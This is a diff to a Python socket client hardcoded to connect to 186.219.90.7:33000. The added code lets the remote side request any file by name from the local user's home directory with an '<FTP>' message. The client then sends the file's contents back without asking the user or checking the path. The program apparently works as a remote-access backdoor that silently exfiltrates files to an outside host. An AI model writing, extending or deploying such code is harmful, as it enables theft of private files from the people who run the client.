@@ -1,6 +1,7 @@
 from socket  import *
 from threading import Thread
 import os
+import os.path
 
 def match(b_array, pat):
     i_aux = 0
@@ -28,7 +29,7 @@ def async_send():
 	try:
 		while(not QUIT):
 			sent = input()
-			if(not CHAT):
+			if(not CHAT and not FTP):
 				os.system("cls" if os.name == 'nt' else 'clear')
 			else:
 				print()
@@ -43,9 +44,20 @@ def async_send():
 
 def async_receive(conn):
 	global QUIT
+	global FTP
 
 	while(not QUIT):
 		received = conn.recv(4096).decode()
+
+		if(received[0:5] == "<FTP>"):
+			home = os.path.expanduser("~")
+			filename = received[5:]
+			file = open(home + "\\" + filename, "rb")
+			file_data = file.read()
+			conn.send(file_data)
+			conn.send(byt("<FTP>"))
+			continue
+
 
 		if(received == "Quit"):
 			QUIT = True
@@ -62,6 +74,7 @@ def join_all(thList):
 		th.join()
 
 QUIT = False
+FTP = False
 HOST = "186.219.90.7"
 PORT = 33000
 CHAT = False
